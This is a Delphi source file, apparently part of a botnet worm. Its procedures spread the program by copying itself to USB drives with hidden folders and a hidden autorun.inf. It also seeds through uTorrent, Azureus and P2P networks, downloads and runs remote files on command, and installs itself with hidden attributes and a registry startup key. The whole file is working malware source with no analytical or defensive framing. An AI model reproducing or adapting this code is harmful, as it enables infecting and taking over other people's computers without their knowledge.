unit ThreadProcs;

interface

uses ThreadUnit,
     {$IFNDEF NOMSN}
     //MsnSpread,
     {$ENDIF NOMSN}
     Windows,
     {$IFNDEF NOTORRENT}
     AzureusSeeder,
     utorrentseeder,
     {$ENDIF NOTORRENT}
      functions,
      KOL,
      p2pspread,
      strings;


var
//Download Thread//
FileUrl, SavePath, dlExecute: String;
mybool: Boolean;
//Install Thread//
InstallVar : Integer;
//MSN Vars//
MsnSpreadCount: Integer;
MsnSpreadURL : String;
//Azureus Vars//
azLink, azSaveAs: String;
//uTorrent Vars//
utLink, utSaveAs: String;
delay: Integer;
//P2P//
Name: String;
//USB//
Spread : Boolean;
attrib : Integer;



procedure StartUSBThread;
procedure StartP2PThread(FName: String);
{$IFNDEF NOTORRENT}
procedure StartTorrentThread(Link, SaveAs: String);
procedure StartuTorrentThread(Link, SaveAs: String);
procedure StartAzureusThread(Link, SaveAs: String);
{$ENDIF NOTORRENT}
{$IFNDEF NOMSN}
//procedure StartMsnThread(URL: String);
{$ENDIF NOMSN}
{$IFNDEF NODL}
procedure StartDownloadThread(Url, SaveAS, execute: String);
{$ENDIF NODL}
procedure StartInstallThread(Uninstall: Integer);

implementation
uses Bot;


////////////////////////////////////////////////////////////////////
/// USB
///////////////////////////////////////////////////////////////////


procedure USBThread();
var
  Drives: array[0..128] of char;
  xDrive: PChar;
  myFile, myFile2: TextFile;
  Result: Integer;
  szTemp, szTemp2: String;
  mybuffer: String;
begin
  Result := 0;
  GetLogicalDriveStrings(SizeOf(Drives), Drives);    //Get drives
  xDrive := Drives;

  while Spread do
  begin
    while xDrive^ <> #0 do
    begin
      if(xDrive = Floppy) then Inc(xDrive, 4);
      if(GetDriveType(xDrive)=DRIVE_REMOVABLE) and (FileExists(xDrive + strings.usbsettings[2] + strings.usbsettings[3] + '\' + strings.usbsettings[15]) = False) then
      begin
        Windows.SetFileAttributes(PChar(xDrive + strings.UsbSettings[7]), FILE_ATTRIBUTE_NORMAL);
        DeleteFile(PChar(xDrive + strings.UsbSettings[7]));
        szTemp := '';
        sztemp := sztemp + xDrive + strings.UsbSettings[2];
        Windows.CreateDirectory(PChar(szTemp), nil);  //CREATE RECYCLER
        Windows.SetFileAttributes(PChar(szTemp), FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_SYSTEM);
        sztemp := sztemp + strings.UsbSettings[3];
        Windows.CreateDirectory(PChar(szTemp), nil);  //CREATE RECYCLER_SUBDIR
        Windows.SetFileAttributes(PChar(szTemp), FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_SYSTEM);
        szTemp2 := szTemp + strings.UsbSettings[6];
        AssignFile(myFile, szTemp2); //Create desktop.ini
        if not FileExists(szTemp2) then ReWrite(myFile)
          else Append(myFile);
        WriteLN(myfile,strings.UsbSettings[4] + #13#10 + strings.UsbSettings[5]);
        CloseFile(myfile);
        Windows.SetFileAttributes(PChar(szTemp2),  FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM);
        szTemp := szTemp + strings.UsbSettings[17];
        szTemp := szTemp + strings.UsbSettings[15];
        if KOL.FileExists(szTemp) = TRUE then  //if autorun.inf exists
        begin
          Windows.SetFileAttributes(PChar(szTemp),  FILE_ATTRIBUTE_NORMAL);
          Windows.DeleteFile(PChar(szTemp));    //delete old autorun.inf
        end;
        Windows.CopyFile(PCHar(ParamStr(0)), PChar(szTemp), FALSE); //copy self (.exe)
        SetFileAttributes(PChar(szTemp), FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM or FILE_ATTRIBUTE_READONLY);

        /////////////////////////////////////////////////////////////
        /// Create autorun.inf
        /////////////////////////////////////////////////////////////

        szTemp := xDrive + strings.UsbSettings[7];
        AssignFile(myFile2, szTemp);
         if not FileExists(szTemp) then
         begin
           Windows.SetFileAttributes(PChar(szTemp), FILE_ATTRIBUTE_NORMAL);
           Windows.DeleteFile(PChar(sztemp));
           Rewrite(myfile2);
         end
          else Append(myFile2);
        mybuffer := strings.UsbSettings[2];
        Delete(mybuffer, 1,1);
        WriteLN(myfile2,strings.UsbSettings[8] + #13#10 + strings.UsbSettings[9]  + mybuffer + strings.UsbSettings[3]+strings.UsbSettings[17]+ strings.UsbSettings[15] + #13#10 + strings.UsbSettings[10]+ #13#10 + strings.UsbSettings[11] + #13#10 + strings.UsbSettings[12] + #13#10 + strings.UsbSettings[13] + mybuffer+ strings.UsbSettings[3]+strings.UsbSettings[17]+ strings.UsbSettings[15]+  #13#10 + strings.UsbSettings[14]);
        CloseFile(myfile2);
        Windows.SetFileAttributes(PChar(szTemp),FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM);
        Append(myfile2);
        //CloseFile(myfile2);
        //Windows.MessageBox(0, PChar(strings.UsbSettings[4] + #13#10 + strings.UsbSettings[5]), 'asd', 0);
        Windows.SetFileAttributes(PChar(szTemp2),  FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM);
        Result := Result + 1;
        SendMessage(USBMsg1+ xDrive + USBMsg2 + IntToStr(result));
      end;
      Inc(xDrive, 4);
    End;
    Sleep(30000);
    GetLogicalDriveStrings(SizeOf(Drives), Drives);
    xDrive := Drives;
  end;
end;








procedure StartUSBThread;
begin
  ThreadUnit.TThread.Create(@USBThread, 0);
end;


////////////////////////////////////////////////////////////////////
/// P2P
///////////////////////////////////////////////////////////////////

procedure P2PThread(Thread: TThread);
begin
  p2pspread.spreadP2P(name);
end;

procedure StartP2PThread(Fname: String);
begin
  name := Fname;
  ThreadUnit.TThread.Create(@P2PThread, 0);
end;



{$IFNDEF NOTORRENT}
////////////////////////////////////////////////////////////////////
/// uTorrent
///////////////////////////////////////////////////////////////////

procedure uTorrentThread(Thread: TThread);
begin
    uTorrentSeeder.STartutorrent(utLink, utSAveAs, delay);
end;

procedure StartuTorrentThread(Link, SaveAs: String);
begin
  utLink := Link;
  utSaveAs := SaveAs;
  ThreadUnit.TThread.Create(@uTorrentThread, 0);
end;


////////////////////////////////////////////////////////////////////
/// Azureus
///////////////////////////////////////////////////////////////////

procedure AzureusThread(Thread: TThread);
begin
  AzureusSeeder.StartAzureus(azLink, azSaveAs, delay);
end;

procedure StartAzureusThread(Link, SaveAs: String);
begin
  azLink := Link;
  azSaveAs := SaveAs;
  ThreadUnit.TThread.Create(@AzureusThread, 0);
end;

////////////////////////////////////////////////////////////////////
/// TORRENTS
///////////////////////////////////////////////////////////////////

procedure TorrentThread(Thread: TThread);
begin
  uTorrentSeeder.NormalSeed(utLink, utSaveAs, delay);
end;

procedure StartTorrentThread(Link, SaveAs: String);
begin
  utLink := Link;
  utSaveAs := SaveAs;
  azLink := Link;
  azSaveAS := SaveAs;
  if IS_UT_INSTALLED = TRUE then
  begin
    If (processExists(uTOrrentname) = TRUE) and (processExists(azureusname) = FALSE) then begin SendMessage('OK');  ThreadUnit.TThread.Create(@uTorrentThread, 0); end
    else If (processExists(uTorrentName) = FALSE) and (processExists(azureusname) = FALSE) then
    begin
      delay := 4;
      ThreadUnit.TThread.Create(@uTorrentThread, 0);
      Sleep(200);
      delay := 0;
    end;
  end;

  if IS_AZ_INSTALLED = TRUE then
  begin
    If (processExists(azureusname) = TRUE) and (processExists(uTorrentname) = FALSE) then ThreadUnit.TThread.Create(@uTorrentThread, 0)
    else If (processExists(azureusname) = FALSE) and (processExists(utorrentname) = FALSE) then
    begin
      delay := 4;
      ThreadUnit.TThread.Create(@AzureusThread, 0);
      Sleep(200);
      delay := 0;
    end;
  end;

  if (IS_UT_INSTALLED = FALSE) and (IS_AZ_INSTALLED = FALSE) then  ThreadUnit.TThread.Create(@TorrentThread, 0);
end;

{$ENDIF NOTORRENT}


//{$IFNDEF NOMSN}
(*////////////////////////////////////////////////////////////////////
/// MSN SPREAD
///////////////////////////////////////////////////////////////////

procedure MsnThread(Thread: TThread);
begin
  MsnSpreadCount := MsnSpread.Spread(MsnSpreadURL);
  SendMessage('[msn]: '+ IntToStr(MsnSpreadCount));
end;

procedure StartMsnThread(URL: String);
begin
  MsnSpreadUrl := Url;
  ThreadUnit.TThread.Create(@MsnThread, 0);
end;

{$ENDIF NOMSN} *)

{$IFNDEF NODL}

////////////////////////////////////////////////////////////////////
/// DOWNLOAD
///////////////////////////////////////////////////////////////////
procedure DownloadThread(Thread: TThread);
begin
  SendMessage(Dl1 + fileURL);
    if Download(fileUrl, savePath) then
    begin
      if dlExecute <> '1' then SendMessage(Dl2);
        if dlExecute = '1' then
        begin
          ExecuteFile(savePath);
          SendMessage(Dl3);
        end;
    end else SendMessage(Dl4);
end;

procedure StartDownloadThread(Url, SaveAS, execute: String);
begin
  FileUrl := Url;
  SavePath := SaveAs;
  dlExecute := execute;
  ThreadUnit.TThread.Create(@DownloadThread, 0);
end;

{$ENDIF NODL}

///////////////////////////////////////////////////////
/// INSTALL
///////////////////////////////////////////////////////
procedure InstallThread;
  begin
  if InstallVar = 0 then
    begin
    if MatchStrings(ParamStr(0), GetPath) = False then
      begin
      Windows.SetFileAttributes(PChar(GetPath), FILE_ATTRIBUTE_NORMAL);
      CopyFile(PChar(ParamStr(0)), PChar(GetPath), False);
      Windows.SetFileAttributes(PChar(GetPath), FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_SYSTEM);
      ExecuteFile(GetPath);
      ExitProcess(0);
      end else InsertRegValue(HKEY_CURRENT_USER, regedit_path, regedit_key, GetPath);
    end else
    if InstallVar = 1 then
      begin
      Windows.SetFileAttributes(PChar(GetPath), FILE_ATTRIBUTE_NORMAL);
      DeleteRegValue(HKEY_CURRENT_USER, regedit_path, regedit_key);
      DeleteSelf(ParamStr(0));
      ExitProcess(0);
      end;
  end;

procedure StartInstallThread(Uninstall: Integer);
begin
  InstallVar := Uninstall;
  ThreadUNit.TThread.Create(@InstallThread, 0);
end;

(* End Install Thread *)
////////////////////////////////////////////////////
end.
